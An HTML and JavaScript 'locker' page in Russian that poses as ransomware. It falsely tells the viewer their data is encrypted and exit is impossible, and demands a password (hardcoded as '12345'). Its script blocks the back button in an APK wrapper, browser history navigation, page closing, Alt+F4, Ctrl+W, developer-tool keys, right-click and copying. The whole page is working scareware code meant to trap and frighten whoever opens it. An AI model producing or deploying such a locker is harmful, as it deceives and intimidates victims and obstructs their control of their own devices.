<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Adovi Locker — locked</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #00ff88;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            overflow: hidden;
            user-select: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 999999;
        }
        .container {
            background: #111;
            padding: 40px;
            border-radius: 30px;
            border: 3px solid #ff0040;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 80px rgba(255, 0, 64, 0.6);
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 80px rgba(255, 0, 64, 0.6); }
            50% { box-shadow: 0 0 120px rgba(255, 0, 64, 0.9); }
            100% { box-shadow: 0 0 80px rgba(255, 0, 64, 0.6); }
        }
        h1 {
            font-size: 46px;
            color: #ff0040;
            text-shadow: 0 0 30px #ff0040;
            margin-bottom: 10px;
            letter-spacing: 5px;
        }
        .subtitle {
            color: #ff6666;
            font-size: 14px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 3px;
        }
        .icon {
            font-size: 80px;
            margin: 10px 0;
        }
        input {
            width: 100%;
            padding: 18px;
            background: #1a1a1a;
            border: 2px solid #ff0040;
            border-radius: 12px;
            color: #fff;
            font-size: 22px;
            text-align: center;
            margin: 20px 0;
            outline: none;
            letter-spacing: 3px;
            box-shadow: inset 0 0 20px rgba(255, 0, 64, 0.2);
        }
        input:focus {
            border-color: #00ff88;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
        }
        button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, #ff0040, #cc0033);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 0 30px rgba(255, 0, 64, 0.4);
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 50px rgba(255, 0, 64, 0.7);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ff0040;
            min-height: 24px;
        }
        #errorMessage {
            color: #ff0040;
            font-size: 18px;
            margin-top: 15px;
            text-shadow: 0 0 15px #ff0040;
        }
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #555;
            letter-spacing: 2px;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.95);
            z-index: 999998;
            pointer-events: none;
        }
        .shake {
            animation: shake 0.4s ease-in-out;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-20px); }
            50% { transform: translateX(20px); }
            75% { transform: translateX(-10px); }
            100% { transform: translateX(10px); }
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="container" id="lockerContainer">
        <div class="icon">☠️</div>
        <h1>ЗАБЛОКИРОВАНО</h1>
        <div class="subtitle">⛔ ВЫХОД НЕВОЗМОЖЕН</div>
        <p style="color: #aaa; margin-bottom: 15px;">
            Ваши данные зашифрованы.<br>
            Введите пароль для разблокировки.
        </p>
        <input type="password" id="passwordInput" placeholder="ПАРОЛЬ" autocomplete="off">
        <button onclick="unlock()">🔓 РАЗБЛОКИРОВАТЬ</button>
        <div id="status"></div>
        <div id="errorMessage"></div>
        <div class="footer">🔒 Система заблокирована до ввода пароля</div>
    </div>

    <script>
        // ===== НАСТРОЙКИ =====
        const PASSWORD = "12345";
        const REDIRECT_URL = "https://www.google.com";

        // ===== БЛОКИРОВКА ВЫХОДА (ДЛЯ APK) =====
        // Блокировка кнопки "Назад" в APK
        document.addEventListener('deviceready', function() {
            document.addEventListener('backbutton', function(e) {
                e.preventDefault();
                document.getElementById('errorMessage').innerText = '⛔ Кнопка назад заблокирована!';
                document.getElementById('lockerContainer').classList.add('shake');
                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
            });
        });

        // Блокировка закрытия через браузер
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);

        window.onbeforeunload = (e) => {
            e.preventDefault();
            e.returnValue = "Выход невозможен! Введите пароль.";
            return "Выход невозможен! Введите пароль.";
        };

        // Блокировка клавиш
        document.addEventListener('keydown', (e) => {
            const banned = ['F4', 'F12', 'Escape'];
            const combos = [
                e.altKey && e.key === 'F4',
                e.ctrlKey && e.key === 'w',
                e.ctrlKey && e.shiftKey && e.key === 'w',
                e.ctrlKey && e.key === 'u',
                e.ctrlKey && e.shiftKey && e.key === 'i'
            ];
            if (banned.includes(e.key) || combos.some(c => c)) {
                e.preventDefault();
                document.getElementById('errorMessage').innerText = '⛔ Попытка выхода заблокирована!';
                document.getElementById('lockerContainer').classList.add('shake');
                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
            }
        });

        // Блокировка правого клика
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());
        document.addEventListener('copy', e => e.preventDefault());

        // ===== РАЗБЛОКИРОВКА =====
        function unlock() {
            const input = document.getElementById('passwordInput').value;
            const status = document.getElementById('status');
            const error = document.getElementById('errorMessage');

            if (input === PASSWORD) {
                status.innerHTML = '✅ ПАРОЛЬ ВЕРНЫЙ! РАЗБЛОКИРОВКА...';
                status.style.color = '#00ff88';
                error.innerText = '';
                document.getElementById('passwordInput').style.borderColor = '#00ff88';
                document.getElementById('passwordInput').disabled = true;
                document.querySelector('button').disabled = true;
                document.querySelector('button').style.background = '#00ff88';
                document.querySelector('button').innerText = '✅ РАЗБЛОКИРОВАНО';
                window.onbeforeunload = null;
                setTimeout(() => {
                    status.innerHTML = '✅ ПЕРЕХОД...';
                    setTimeout(() => window.location.href = REDIRECT_URL, 1500);
                }, 1000);
            } else {
                error.innerText = '❌ НЕВЕРНЫЙ ПАРОЛЬ!';
                document.getElementById('passwordInput').value = '';
                document.getElementById('passwordInput').focus();
                document.getElementById('lockerContainer').classList.add('shake');
                setTimeout(() => document.getElementById('lockerContainer').classList.remove('shake'), 500);
                status.innerHTML = '❌ Попробуйте снова.';
                status.style.color = '#ff0040';
                document.getElementById('passwordInput').style.borderColor = '#ff0040';
                document.getElementById('errorMessage').style.color = '#ff0040';
            }
        }

        window.onload = () => {
            document.getElementById('passwordInput').focus();
            Object.defineProperty(window, 'PASSWORD', {
                get: () => 'Доступ запрещён',
                set: () => {}
            });
        };
    </script>
</body>
            </html>
